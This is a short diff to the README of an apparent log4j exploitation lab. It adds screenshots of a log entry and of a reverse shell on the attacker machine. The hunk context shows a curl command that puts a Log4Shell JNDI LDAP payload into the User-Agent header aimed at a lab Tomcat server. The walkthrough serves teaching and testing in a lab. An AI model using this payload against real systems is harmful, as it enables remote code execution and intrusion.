@@ -65,3 +65,9 @@ curl ubuntu-server:8080/mywebapp/logExample -H 'User-Agent: ${jndi:ldap://192.16
 ```
 
 With this a log entry at `/PATH/TO/apache-tomcat/logs/app.log` should be present and a connection back should confirm this. With this, congratulation! You exploited log4j!
+
+#### Log entry:
+![app.log entry](https://raw.githubusercontent.com/xmehulx/log4j-playground/main/resources/log4j-entry.png)
+
+#### Connection on Attacker machine
+![reverse shell](https://raw.githubusercontent.com/xmehulx/log4j-playground/main/resources/log4j.png)
